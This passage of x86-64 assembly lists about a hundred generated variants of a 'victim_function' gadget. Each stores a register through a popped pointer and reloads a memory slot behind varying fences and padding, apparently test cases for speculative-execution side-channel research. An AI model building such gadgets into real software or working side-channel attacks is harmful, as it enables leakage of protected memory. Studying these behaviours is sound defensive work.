	jmp	.Lvictim_function_win0_continue
## Variant 932
.Lvictim_function_win0_var932:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 933
.Lvictim_function_win0_var933:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 934
.Lvictim_function_win0_var934:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 935
.Lvictim_function_win0_var935:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 936
.Lvictim_function_win0_var936:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 937
.Lvictim_function_win0_var937:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 938
.Lvictim_function_win0_var938:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 939
.Lvictim_function_win0_var939:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 940
.Lvictim_function_win0_var940:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 941
.Lvictim_function_win0_var941:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 942
.Lvictim_function_win0_var942:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 943
.Lvictim_function_win0_var943:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 944
.Lvictim_function_win0_var944:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 945
.Lvictim_function_win0_var945:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 946
.Lvictim_function_win0_var946:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 947
.Lvictim_function_win0_var947:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 948
.Lvictim_function_win0_var948:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 949
.Lvictim_function_win0_var949:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 950
.Lvictim_function_win0_var950:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 951
.Lvictim_function_win0_var951:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 952
.Lvictim_function_win0_var952:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 953
.Lvictim_function_win0_var953:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 954
.Lvictim_function_win0_var954:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 955
.Lvictim_function_win0_var955:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 956
.Lvictim_function_win0_var956:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 957
.Lvictim_function_win0_var957:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 958
.Lvictim_function_win0_var958:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 959
.Lvictim_function_win0_var959:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 960
.Lvictim_function_win0_var960:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 961
.Lvictim_function_win0_var961:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 962
.Lvictim_function_win0_var962:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 963
.Lvictim_function_win0_var963:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 964
.Lvictim_function_win0_var964:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 965
.Lvictim_function_win0_var965:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 966
.Lvictim_function_win0_var966:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 967
.Lvictim_function_win0_var967:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 968
.Lvictim_function_win0_var968:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 969
.Lvictim_function_win0_var969:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 970
.Lvictim_function_win0_var970:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 971
.Lvictim_function_win0_var971:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 972
.Lvictim_function_win0_var972:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 973
.Lvictim_function_win0_var973:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 974
.Lvictim_function_win0_var974:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 975
.Lvictim_function_win0_var975:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 976
.Lvictim_function_win0_var976:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 977
.Lvictim_function_win0_var977:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 978
.Lvictim_function_win0_var978:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 979
.Lvictim_function_win0_var979:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 980
.Lvictim_function_win0_var980:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 981
.Lvictim_function_win0_var981:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 982
.Lvictim_function_win0_var982:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 983
.Lvictim_function_win0_var983:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 984
.Lvictim_function_win0_var984:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 985
.Lvictim_function_win0_var985:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 986
.Lvictim_function_win0_var986:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 987
.Lvictim_function_win0_var987:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 988
.Lvictim_function_win0_var988:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 989
.Lvictim_function_win0_var989:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 990
.Lvictim_function_win0_var990:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 991
.Lvictim_function_win0_var991:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 992
.Lvictim_function_win0_var992:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 993
.Lvictim_function_win0_var993:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 994
.Lvictim_function_win0_var994:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 995
.Lvictim_function_win0_var995:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 996
.Lvictim_function_win0_var996:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 997
.Lvictim_function_win0_var997:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 998
.Lvictim_function_win0_var998:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 999
.Lvictim_function_win0_var999:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1000
.Lvictim_function_win0_var1000:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1001
.Lvictim_function_win0_var1001:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1002
.Lvictim_function_win0_var1002:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1003
.Lvictim_function_win0_var1003:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1004
.Lvictim_function_win0_var1004:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1005
.Lvictim_function_win0_var1005:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1006
.Lvictim_function_win0_var1006:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1007
.Lvictim_function_win0_var1007:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1008
.Lvictim_function_win0_var1008:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1009
.Lvictim_function_win0_var1009:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1010
.Lvictim_function_win0_var1010:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1011
.Lvictim_function_win0_var1011:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1012
.Lvictim_function_win0_var1012:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1013
.Lvictim_function_win0_var1013:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1014
.Lvictim_function_win0_var1014:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1015
.Lvictim_function_win0_var1015:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1016
.Lvictim_function_win0_var1016:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1017
.Lvictim_function_win0_var1017:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1018
.Lvictim_function_win0_var1018:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1019
.Lvictim_function_win0_var1019:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1020
.Lvictim_function_win0_var1020:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1021
.Lvictim_function_win0_var1021:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1022
.Lvictim_function_win0_var1022:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1023
.Lvictim_function_win0_var1023:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1024
.Lvictim_function_win0_var1024:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1025
.Lvictim_function_win0_var1025:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1026
.Lvictim_function_win0_var1026:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1027
.Lvictim_function_win0_var1027:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1028
.Lvictim_function_win0_var1028:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
